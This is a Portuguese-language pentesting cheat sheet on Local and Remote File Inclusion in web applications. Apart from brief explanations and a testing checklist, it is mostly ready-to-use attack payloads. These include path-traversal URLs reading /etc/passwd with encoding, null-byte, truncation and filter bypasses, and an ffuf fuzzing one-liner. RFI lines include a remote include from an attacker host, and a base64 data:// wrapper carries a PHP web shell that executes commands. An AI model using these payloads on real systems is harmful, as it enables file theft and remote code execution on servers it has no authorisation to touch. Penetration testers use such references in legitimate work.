## LFI 
<p>A vulnerabilidade de Local File Inclusion (LFI) surge da utilização insegura de parâmetros HTTP para controle de conteúdo em aplicações web, prática comum em linguagens como PHP, Node.js e Java. Frameworks frequentemente usam templates para incluir dinamicamente conteúdos com base em parâmetros da URL, como em chamadas do tipo /index.php?page=about. Quando esses parâmetros são passados diretamente para funções como include() sem validação, atacantes podem explorar essa falha para incluir arquivos locais sensíveis, como /etc/passwd ou arquivos de configuração. Essa exposição pode revelar código-fonte e credenciais, facilitando ataques mais graves como SQL Injection ou escalonamento de privilégios. Em ambientes mal configurados, LFI pode evoluir para execução remota de código, comprometendo completamente o servidor e possibilitando movimentação lateral e persistência.</p>

## RFI
<p>Quando uma função vulnerável nos permite incluir arquivos remotos, podemos hospedar um script malicioso e incluí-lo na página vulnerável para executar funções maliciosas e obter execução remota de código. No PHP é necessário que o parâmetro allow_url_include esteja habilitado, o padrão é estar desabilitado. </p>

:fries: Checklist
- observe os campos das requisições em todos os métodos HTTP
- observe nos campos das requisições o tipo de informação usada 
- observe como a informação transmitida nos campos é processada
- observe funções de upload
- modifique o valor de um campo na requisição e observe como a aplicação responde
- adicione no campo payloads de LFI
- adicione no campo url para validar RFI
- crie um arquivo com código executável e faça o upload na aplicação
- procure acessar o arquivo para executar o código 

#### LFI Básico
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

```

#### Null Byte (%00)
```http://example.com/index.php?page=../../../etc/passwd%00```

#### Encoding
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### LFI a partir de diretórios existentes
```
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

#### Deep
- depth of 3
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
- depth of 4
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```

### Gerar wordlist de LFI a partir de uma wordlist existente
```
# 1
sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt

# 2
ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```

#### Path Trucation
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
# | Sempre testar adicionando um diretório falso a/ Essa vulnerabilidade foi corrigida no PHP 5.3

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```

#### Filter Bypass
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```

### RFI
```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
<p>Se por algum motivo allow_url_include estiver ativado, mas o PHP estiver filtrando o acesso a páginas externas, você pode usar, por exemplo, o wrapper data com base64 para decodificar um código PHP base64 e egt RCE:</p>
[Ref.:] (https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)

```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt

data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

### Parâmetro para testar LFI
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
